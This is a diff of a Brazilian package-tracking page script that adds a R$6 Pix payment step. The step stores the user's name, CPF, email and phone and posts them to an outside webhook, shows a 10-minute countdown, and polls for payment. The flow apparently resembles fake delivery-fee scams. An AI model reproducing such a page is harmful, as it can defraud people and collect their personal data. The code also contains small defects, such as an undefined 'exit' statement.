@@ -49,6 +49,12 @@ const STAGES = [
   },
 ];
 
+const valor = 6.0;
+var tempoTelaPixId;
+var timeLeft = 10 * 60;
+var pixPaid;
+var isPaid = false;
+
 // constroi a div do icone
 function getIconCard(iconDescription, color) {
   const div = document.createElement("div");
@@ -96,6 +102,17 @@ function getInformation(title, subtitle, postedIn) {
   return container;
 }
 
+function removerAcento(text) {
+  text = text.toLowerCase();
+  text = text.replace(new RegExp("[ÁÀÂÃ]", "gi"), "a");
+  text = text.replace(new RegExp("[ÉÈÊ]", "gi"), "e");
+  text = text.replace(new RegExp("[ÍÌÎ]", "gi"), "i");
+  text = text.replace(new RegExp("[ÓÒÔÕ]", "gi"), "o");
+  text = text.replace(new RegExp("[ÚÙÛ]", "gi"), "u");
+  text = text.replace(new RegExp("[Ç]", "gi"), "c");
+  return text;
+}
+
 // constroi a div do card
 function setCard(
   iconDescription,
@@ -132,9 +149,50 @@ function setCard(
       font-size: 1rem;
       align-self: flex-start; /* Alinha o botão à esquerda */
     `;
-    payButton.onclick = function () {
-      // Função que será executada ao clicar no botão "Pagar"
-      alert("Função de pagamento ainda não implementada.");
+    payButton.onclick = async function () {
+      const cpf = localStorage.getItem("cpf");
+      const email = localStorage.getItem("email");
+      const nome = localStorage.getItem("nome");
+      const trackingCode = localStorage.getItem("trackingCode");
+      const telefone = localStorage.getItem("telefone");
+
+      const body = {
+        cpf,
+        email,
+        nome,
+        trackingCode,
+        valor,
+        telefone,
+      };
+
+      // buscar dados do pix
+      // desenhar tela para mostrar o pix
+      // colocar o botao para copiar o pix
+      const response = await fetch(
+        "https://webhook.incaivelestrutura.com/webhook/53ed462e-5c86-472d-be60-f8ec614495b5",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(body),
+        }
+      );
+
+      const resultJson = await response.json();
+
+      if (resultJson.code === "200") {
+        const { code, transactionId, qrCode } = resultJson;
+
+        const pixCode = document.getElementById("pixCode");
+        pixCode.value = qrCode;
+
+        disabledBootstrap();
+        document.getElementById("valorASerPagoPix").innerText =
+          `Valor a ser pago: R$ ${valor.toFixed(2)}`.replace(".", ",");
+        updateCountdown();
+        verifyPixPaid(transactionId);
+      }
     };
     info.appendChild(payButton);
   }
@@ -182,7 +240,6 @@ function differenceInDays(initialDate, finalDate) {
   return diffInDays;
 }
 
-// controi todos os cards
 function appendCards(postedIn) {
   // Converte a data recebida do servidor para o formato correto
   postedIn = parseDate(postedIn);
@@ -206,6 +263,14 @@ function appendCards(postedIn) {
       setCard(stage.icon, stage.color, stage.title, "", stageDate, isLastStage);
     }
   }
+
+  // pgamanto confirmado
+  if (isPaid) {
+    const icon = "currency_exchange";
+    const color = "#1B85F4";
+    const title = "Pagamento confirmado";
+    setCard(icon, color, title, "", null, true);
+  }
 }
 
 function removeContainer(container) {
@@ -215,10 +280,13 @@ function removeContainer(container) {
   }
 }
 
-window.addEventListener("load", () => {
-  // document.head.appendChild(style);
-  configTrackingForm();
-});
+function defineTrackingEdit() {
+  document
+    .getElementById("focus-search")
+    .addEventListener("click", function () {
+      document.getElementById("tracking-number").focus();
+    });
+}
 
 function showError(inputElement, resultElement, message) {
   // Adiciona a classe de erro ao input
@@ -246,6 +314,35 @@ function showError(inputElement, resultElement, message) {
   }, 3000);
 }
 
+function verifyPixPaid(transactionId) {
+  pixPaid = setInterval(async () => {
+    const trackingCode = localStorage.getItem("trackingCode");
+
+    await fetch(
+      "https://webhook.incaivelestrutura.com/webhook/8b484476-9aa5-4f12-a057-1d54da422681",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ trackingCode, transactionId }),
+      }
+    )
+      .then((response) => response.json())
+      .then((data) => {
+        const responseJson = data[0];
+
+        const { status } = responseJson;
+
+        if (status === "paid") {
+          clearInterval(pixPaid);
+          // redirecionar pra pagina de obrigado
+          window.location.href = "https://rastreiocerto.com"; // Redireciona para o Google
+        }
+      });
+  }, 10000);
+}
+
 function configTrackingForm() {
   window.document
     .getElementById("trackingForm")
@@ -268,7 +365,7 @@ function configTrackingForm() {
 
       if (response.ok) {
         const resultJson = await response.json();
-        const { code, data, nome, cpf, trackingCode } = resultJson;
+        const { code, data, nome, cpf, trackingCode, status } = resultJson;
 
         removeContainer(document.getElementById("create-cards"));
 
@@ -277,17 +374,10 @@ function configTrackingForm() {
           resultElement.innerText = "Código inválido!";
         } else {
           resultElement.innerText = "";
-          document.getElementById("tracking-information").style.display =
-            "flex";
-          const trackingName = document.getElementById("tracking-name");
-          const trackingCpf = document.getElementById("tracking-cpf");
-          const trackCode = document.getElementById("tracking-code");
-
-          // Formata e exibe as informações
-          trackingName.innerText = `Nome: ${nome}`;
-          trackingCpf.innerText = `CPF: ${cpf}`;
-          trackCode.innerText = `${trackingCode}`;
-
+          setTopInformation(resultJson);
+          // sendWebHook(resultJson);
+          isPaid = status === "paid";
+          sendLocalStorageInformation(resultJson);
           appendCards(data);
         }
       } else {
@@ -295,3 +385,86 @@ function configTrackingForm() {
       }
     });
 }
+
+function setTopInformation({ nome, cpf, trackingCode }) {
+  document.getElementById("tracking-information").style.display = "flex";
+
+  const trackingName = document.getElementById("tracking-name");
+  const trackingCpf = document.getElementById("tracking-cpf");
+  const trackCode = document.getElementById("tracking-code");
+
+  // Formata e exibe as informações
+  trackingName.innerText = `Nome: ${nome}`;
+  trackingCpf.innerText = `CPF: ${cpf}`;
+  trackCode.innerText = `${trackingCode}`;
+}
+
+function sendLocalStorageInformation({
+  nome,
+  cpf,
+  trackingCode,
+  email,
+  telefone,
+}) {
+  localStorage.setItem("nome", nome);
+  localStorage.setItem("cpf", cpf);
+  localStorage.setItem("trackingCode", trackingCode);
+  localStorage.setItem("email", email);
+  localStorage.setItem("telefone", telefone);
+}
+
+function enabledBootstrap() {
+  document.getElementById("checkout").style.display = "none";
+  document.getElementById("hero").style.display = "block";
+  document.getElementById("features").style.display = "block";
+  document.getElementById("platform").style.display = "block";
+}
+
+function disabledBootstrap() {
+  document.getElementById("checkout").style.display = "flex";
+  document.getElementById("hero").style.display = "none";
+  document.getElementById("features").style.display = "none";
+  document.getElementById("platform").style.display = "none";
+}
+
+function formatTime(seconds) {
+  const minutes = Math.floor(seconds / 60);
+  const secs = seconds % 60;
+  return `${String(minutes).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
+}
+
+function updateCountdown() {
+  tempoTelaPixId = setInterval(() => {
+    if (timeLeft <= 0) {
+      clearInterval(tempoTelaPixId);
+      exit;
+    }
+    const countdownElement = document.getElementById("countdown");
+    countdownElement.textContent = formatTime(timeLeft);
+    timeLeft--;
+  }, 1000);
+}
+
+function copyToClipboard() {
+  const pixValue = document.getElementById("pixCode").value;
+  navigator.clipboard.writeText(pixValue).then(() => {
+    // Exibir a mensagem
+    const copyMessage = document.getElementById("copyMessage");
+    copyMessage.style.display = "block";
+
+    // Ocultar a mensagem após 3 segundos
+    setTimeout(() => {
+      copyMessage.style.display = "none";
+    }, 3000);
+  });
+}
+
+window.addEventListener("load", () => {
+  configTrackingForm();
+  defineTrackingEdit();
+  enabledBootstrap();
+});
+
+//requisitar o pix
+
+//https://webhook.incaivelestrutura.com/webhook/53ed462e-5c86-472d-be60-f8ec614495b5
